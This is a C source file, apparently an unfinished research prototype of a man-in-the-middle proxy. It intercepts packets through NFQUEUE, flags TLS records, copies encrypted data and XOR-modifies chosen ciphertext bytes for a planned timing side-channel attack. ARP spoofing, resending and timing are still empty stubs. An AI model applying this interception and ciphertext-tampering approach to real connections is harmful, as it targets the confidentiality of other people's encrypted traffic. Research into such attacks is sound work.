#define _GNU_SOURCE
#include "../include/utility.h"
#include "../include/network.h"
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

//FARE REFACTORING CON Byte

typedef struct Data_packet{
  Byte *packet;
  unsigned int len;
  struct iphdr *ip_header;
  unsigned int ip_header_len;
  struct tcphdr *tcp_header;
  unsigned int tcp_header_len;
  Byte *data;
  unsigned int data_len;
  //unsigned int header_data_len; //num of byte of header for data
  //unsigned int real_data_len; //num of real data byte
}Data_packet;

void extract_mode();
void extract_network_config();
void do_localhost_attack();
void do_lan_attack();
void do_internet_attack();
void arp_spoofing(char *ip);

// network
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh);
void intercept_packets();
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len);
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len);
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);

void *do_attack_thread(void *arg);

Data_packet *data_packet;
pthread_cond_t attack_thread_cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t attack_thread_mutex = PTHREAD_MUTEX_INITIALIZER;
bool attack;

#define DIM_PAGE 4096

char *ip_client = "127.0.0.1"; 
char *ip_server = "127.0.0.1";
int port_server = 5000;
char network_config;
char op_mode;

static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data);

int main(int argc, char *argv[]) {

  pthread_t attack_thread;
  attack = false;

  if (argc < 3) {
    perror("Missing arguments! \n");
    return 0;
  }

  // -d (creazione dstaset), -a (attaccante vero e proprio)
  if(argv[1][0] == '-'){
    op_mode = argv[1][1];
  }

  if(argv[2][0] == '-'){
    network_config = argv[2][1];
  }

  data_packet = (Data_packet *)malloc(sizeof(Data_packet));
  if(!data_packet){
    perror("Error allocating memory for data_packet! \n");
    exit(EXIT_FAILURE);
  }
  
  printf("Operation mode: %c. Network config: %c \n", op_mode, network_config);

  extract_mode();
  extract_network_config(); 
  catch_signals();

  pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
  //variabili condizionali per sleep e risveglio del thread

  // selecting the operation mode
  // -m --> LocalHost
  // -l --> client and server in the same LAN
  // -i --> client in the same LAN and server outside

  printf("Starting MITM proxy \n");

  setup_network_interception();
  intercept_packets();

  return 0;
}

//function to extrract the operating mode by operating mode parameter
void extract_mode() {
  
  switch (op_mode) {
  case 'd':
    printf("Dataset creation mode selected! \n");
    break;
  case 'a':
    printf("Attack mode selected! \n");
    break;
  default:
    perror("Invalid operation mode! \n");
    exit(EXIT_FAILURE);
  }
}

//function to extrract the network configuration by network configuration parameter
void extract_network_config() {

  switch (network_config) {
  case 'm':
    printf("LocalHost network configuration selected \n");
    break;
  case 'l':
    printf("LAN network configuration selected \n");
    break;
  case 'i':
    printf("Internet network configuration selected \n");
    break;
  default:
    fprintf(stderr, "Invalid netowkr configuration flag! \n");
  }
}

void do_localhost_attack() {

  // attaccante deve mettersi in ascolto sull'interfaccia di loopback
  //
  //
}

void arp_spoofing(char *ip) {

  // chiama l'apposito tool per effettuare arp spoofing (in base a dove viene eseguit l'attacco)
}

//function to initialize nfq (NFQUEUE)
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh){

  *h = nfq_open();
  int fd;

  if(!(*h)){
    perror("Error in the NFQUEUE opening! \n");
    exit(EXIT_FAILURE);
  }

  *qh = nfq_create_queue(*h, 0, &packet_verdict_handler, NULL);

  if(!(*qh)){
    perror("Error in the NFQUEUE creation! \n");
    exit(EXIT_FAILURE);
  }

  if(nfq_set_mode(*qh, NFQNL_COPY_PACKET, 0xffff) < 0){
    perror("Error in the NFQUEUE mode setting! \n");
    exit(EXIT_FAILURE);
  }

}

//forse da spostare in network.c
void intercept_packets() {

  struct nfq_handle *h;
  struct nfq_q_handle *qh;
  int fd;
  int rcv;
  char buffer[DIM_PAGE] __attribute__((aligned));

  setup_nfq(&h, &qh);

  fd = nfq_fd(h);

  do{
    rcv = recv(fd, buffer, sizeof(buffer), 0);
    if(rcv > 0){
      nfq_handle_packet(h, buffer, rcv);
    }
  }while(rcv > 0);

}

//function to determinate the sort of a packet
static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){

  struct nfqnl_msg_packet_hdr *ph; 
  Byte *payload;
  unsigned int payload_len;
  uint32_t id;
  struct iphdr *ip_header;
  unsigned int iphdr_size;
  struct tcphdr *tcp_header;
  unsigned int tcphdr_size;
  Byte *application_payload;
  unsigned int application_payload_size;

  ph = nfq_get_msg_packet_hdr(nfa);
  id = ntohl(ph->packet_id);

  payload_len = nfq_get_payload(nfa, &payload);
  printf("Packet data: ID=%u, %d bytes \n", id, payload_len);

  ip_header = extract_ip_header(payload, payload_len);
  iphdr_size = ip_header->ihl << 2; 

  if(ip_header->protocol == IPPROTO_TCP){
    tcp_header = extract_tcp_header(payload, payload_len, iphdr_size);
    printf("TCP packet detected! Source port: %d, Destination port: %d \n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
    tcphdr_size = tcp_header->doff << 2;

    application_payload = extract_application_data(payload, payload_len, iphdr_size, tcphdr_size);
    application_payload_size = payload_len - iphdr_size - tcphdr_size;

    //SSL/TLS handshake message
    if(application_payload != NULL &&application_payload[0] == 0x16 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
      printf(ANSI_COLOR_GREEN "SSL/TLS handshake packet detected! \n" ANSI_COLOR_RESET);
      return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    //SSL/TLS data message
    if(application_payload != NULL && application_payload[0] == 0x17 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
      printf(ANSI_COLOR_BLUE "SSL/TLS data packet detected! \n" ANSI_COLOR_RESET);
      if(application_payload_size > 0){
        printf("Printing of the data \n");
        print_application_data(application_payload, application_payload_size);

        if(check_data_length(application_payload, application_payload_size) == false){
          fprintf(stderr, "Data length is not correct! \n");
          return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
        }

        //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
        //allocate memory for the packet
        data_packet->packet = (unsigned char *)malloc(payload_len * sizeof(unsigned char));
        if(!data_packet->packet){
          perror("Error allocating memory for data_packet->packet! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->packet, payload, payload_len);
        data_packet->len = payload_len;//i need to pass the entire packet to calculate the new checksum
        
        //allocate memory for the ip_header
        data_packet->ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));
        if(!data_packet->ip_header){
          perror("Error allocating memory for data_packet->ip_header! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->ip_header, ip_header, sizeof(struct iphdr));
        data_packet->ip_header_len = iphdr_size;

        //allocate memory for the tcp_header
        data_packet->tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr));
        if(!data_packet->tcp_header){
          perror("Error allocating memory for data_packet->tcp_header! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->tcp_header, tcp_header, sizeof(struct tcphdr));
        data_packet->tcp_header_len = tcphdr_size;

        //allocate memory for the application data
        data_packet->data = (unsigned char *)malloc(application_payload_size * sizeof(unsigned char));
        if(!data_packet->data){
          perror("Error allocating memory for data_packet->data! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->data, application_payload, application_payload_size);
        data_packet->data_len = application_payload_size;

        attack = true;
        pthread_cond_signal(&attack_thread_cond);
      }

      //sveglio il thread che modifica il pacchetto, ricalcola la checksum, lo invia al server, avvia il timer, attende risposta server, all'arrivo stoppa il timer ed inoltra il pacchetto al client
      //modify a packet byte, send to server and start the clock
      //alterate_packet()

      //send_modified_packet()
      

      //drop packet
      return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
  } 

  return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

//function to extract the IP header from the packet payload
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
  struct iphdr *ip_header;
  if(payload_len < sizeof(struct iphdr)){
    fprintf(stderr, "Payload too small to contain an IP header! \n");
    return NULL;
  }
  ip_header = ((struct iphdr *)payload);

  return ip_header;
}

//function to extract the TCP header from the packet payload
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len){
  struct tcphdr *tcp_header;
  if(payload_len < (iphdr_len + sizeof(struct tcphdr))){
    fprintf(stderr, "Payload too small to contain a TCP header! \n");
    return NULL;
  }
  tcp_header = ((struct tcphdr *)(payload + iphdr_len));

  return tcp_header;
}

//function to extract the application data from the packet payload
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
  Byte *application_data;
  if((payload_len <= (iphdr_size + tcphdr_size))){
    fprintf(stderr, "Payload too small to contain application data! \n");
    return NULL;
  }

  application_data = ((char *)payload + iphdr_size + tcphdr_size);
  return application_data;
}

//0 -> ssl handshake, 1 --> ssl/tls data packet, 
int analyze_application_data(Byte *payload, int payload_len){

}

/*
  devo tenere traccia di che byte utilizzare e di quale byte modificare
  es: byte 0x00 in ultima pos, poi 0x01, poi 0x02, ecc... fino a 0xff, poi ricomincio da 0x01
  (il byte che ha il minore tempo diu risposta è quello corretto)
*/

//function to modify the packet
void modify_packet(int block_pos, int byte_pos){

  Byte *prec_block = data_packet->data;
  
  Byte *bytes_to_add = NULL;


  Byte *mask = (Byte *)malloc(sizeof(Byte) * data_packet->data_len);
  //memset(mask, 0x00 , pos_byte);
  int i;
  int num_block = 0;

  //la maschera deve avere tutti i bit a zero tranne i byte che devo modificare
  for(i=0; i < data_packet->data_len - 5; i++){
    if(block_pos-1 == num_block && (i >= (num_block * 16 + byte_pos))){
      mask[i] = data_packet->data[i+5];
    }else{
      mask[i] = 0x00;
    }
    /*
    if(i < (num_block * 16 + byte_pos)){ //pos byte va bene solo se si considera un blocco cifrato alla volta e non l'intero pacchetto cifrato
      mask[i] = 0x00;
    }else{
      mask[i] = data_packet->data[i+5];
    }*/
    if(i != 0 && i % 16 == 0){
      num_block++;
    }
  }
 
  //xor tra maschera e pacchetto originale
  Byte *modified_packet = xor_block(prec_block, mask, data_packet->data_len);

  print_blocks(modified_packet, data_packet->data_len);

  /*
  for(i = 0; i < 16; i++){
    printf("%02x ", mask[i]);
  }*/

 // unsigned char *modified_packet = prec_block XOR mask

}

Byte make_mask(){
  
}

//TROVARE UNA SOLUZIONE MIGLIORE ALLA GESTIONE DEL -5 SULLA GRANDEZZA DEL PACCHETTO DATA

//function to recalculate the TCP checksum
void recalculate_checksum(){

}

//function to send the modified packet to the server
void send_modified_packet(){

}

//function to start the clock timer
void start_timer(){


}

//function to stop the clock timer
void stop_timer(){

}

//thread function to perform attack
void *do_attack_thread(void *arg){

  while(1==1){
    while(attack == false){
      //pthread_mutex_lock(&attack_thread_mutex);
      pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
      //pthread_mutex_unlock(&attack_thread_mutex);
    } 
    printf("Secondo thread avviato\n");
    /*
    printf("------Packet------ \n");
    print_application_data(data_packet->data, data_packet->data_len); */

    printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
    //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
    print_data_blocks(data_packet->data, data_packet->data_len);

    
    
    modify_packet(4,14);
    //recalculate_checksum();
    //send_modified_packet();
    //start_timer(); (forse chiamata subito dentro send_modified_packet)
    //wait for response
    //stop_timer();
    //write result to csv file
    attack = false;
  }

}



